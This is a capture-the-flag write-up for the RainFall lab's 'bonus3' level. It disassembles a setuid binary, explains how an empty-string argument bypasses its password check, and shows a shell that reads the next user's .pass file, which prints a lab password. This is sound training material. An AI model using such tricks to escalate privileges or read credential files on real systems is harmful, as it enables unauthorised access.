# Bonus3 Write-up: The Logical Null-Byte Truncation

## 1. Code Analysis: The Setup

By tearing down the assembly of `main`, we can map out exactly how the program attempts to secure the final password.

### The File Read

```assembly
0x0804850c <+24>:    mov    DWORD PTR [esp+0x4],edx   ; "r"
0x08048510 <+28>:    mov    DWORD PTR [esp],eax       ; "/home/user/end/.pass"
0x08048513 <+31>:    call   0x8048410 <fopen@plt>
...
0x0804856f <+123>:   call   0x80483d0 <fread@plt>

```

The program opens the password file for the `end` user and reads exactly 66 bytes (`0x42`) into a local buffer on the stack (`esp+0x18`). Let's call this `buffer`.

### The Vulnerability: Controlled Null-Byte Write

```assembly
0x08048579 <+133>:   mov    eax,DWORD PTR [ebp+0xc]
0x0804857c <+136>:   add    eax,0x4
0x0804857f <+139>:   mov    eax,DWORD PTR [eax]       ; Get argv[1]
0x08048581 <+141>:   mov    DWORD PTR [esp],eax
0x08048584 <+144>:   call   0x8048430 <atoi@plt>      ; atoi(argv[1])
0x08048589 <+149>:   mov    BYTE PTR [esp+eax*1+0x18],0x0 ; buffer[eax] = '\0'

```

The program takes our input (`argv[1]`), converts it to an integer using `atoi()`, and then uses that integer as an index to write a single null byte (`0x0`) directly into the buffer that contains the password.

### The Authentication Check

```assembly
0x080485d7 <+227>:   mov    DWORD PTR [esp],eax       ; arg1: buffer
0x080485da <+230>:   call   0x80483b0 <strcmp@plt>    ; strcmp(buffer, argv[1])
0x080485df <+235>:   test   eax,eax
0x080485e1 <+237>:   jne    0x8048601 <main+269>      ; Jump if not equal
...
0x080485f3 <+255>:   mov    DWORD PTR [esp],0x804870a ; "sh"
0x080485fa <+262>:   call   0x8048420 <execl@plt>     ; execl("/bin/sh", "sh", NULL)

```

After writing the null byte, the program uses `strcmp` to compare our input (`argv[1]`) against the modified `buffer`. If they match, it spawns a shell!

---

## 2. The Exploit Strategy: The Empty String

How do we make our input match a password we don't know? We don't. We erase the password entirely using the program's own logic.

We pass an empty string: `""`.

Here is exactly what happens in the memory when we do this:

1. **Read:** `buffer` is filled with the real password (e.g., `"3321b6f81659..."`).
2. **Parse:** `atoi("")` fails to find any numbers, so it safely returns **`0`**.
3. **Overwrite:** The program executes `buffer[0] = '\0'`.
4. **The Result:** By placing a null terminator at the very first index, C string functions now interpret `buffer` as an empty string. The real password is still in memory, but it is entirely hidden behind that first null byte.
5. **The Check:** The program calls `strcmp(buffer, argv[1])`. Since both `buffer` and `argv[1]` are now exactly `""`, `strcmp` returns `0` (a perfect match).

The lock clicks open, and we bypass the entire authentication mechanism without ever knowing the password.

---

## 3. Execution

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c

```
By providing `""`, `atoi` yields `0`, setting `buffer[0] = '\0'`. The `strcmp("", "")` evaluation passes, yielding execution of `/bin/sh`.
finaly the end:
```sh
➜  Rainfall git:(main) ✗ ssh end@10.11.100.192 -p 4242
          _____       _       ______    _ _ 
         |  __ \     (_)     |  ____|  | | |
         | |__) |__ _ _ _ __ | |__ __ _| | |
         |  _  /  _` | | '_ \|  __/ _` | | |
         | | \ \ (_| | | | | | | | (_| | | |
         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.11.100.192:4242
end@10.11.100.192's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
end@RainFall:~$ ls -la
total 13
dr-xr-x---+ 1 end  end     80 Sep 23  2015 .
dr-x--x--x  1 root root   340 Sep 23  2015 ..
-rw-r--r--  1 end  end    220 Apr  3  2012 .bash_logout
-rw-r--r--  1 end  end   3489 Sep 23  2015 .bashrc
-rwsr-s---+ 1 end  users   26 Sep 23  2015 end
-r--r-----+ 1 end  end     65 Sep 23  2015 .pass
-rw-r--r--  1 end  end    675 Apr  3  2012 .profile
end@RainFall:~$ cat end 
Congratulations graduate!
```